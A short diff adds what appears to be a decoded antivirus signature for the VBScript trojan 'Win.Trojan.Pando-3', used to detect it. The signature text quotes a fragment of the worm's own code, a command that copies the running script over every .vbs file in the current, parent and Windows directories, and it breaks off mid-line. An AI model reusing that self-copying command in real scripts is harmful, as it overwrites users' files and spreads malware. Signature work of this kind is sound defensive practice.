@@ -1,0 +1,6 @@
+VIRUS NAME: Win.Trojan.Pando-3
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+un (CommandPath & " /c for %%a in (*.vbs ..\*.vbs %windir%\*.vbs) do copy /y " & Wscript.ScriptFullName & " %%a >nul")
+If Mi
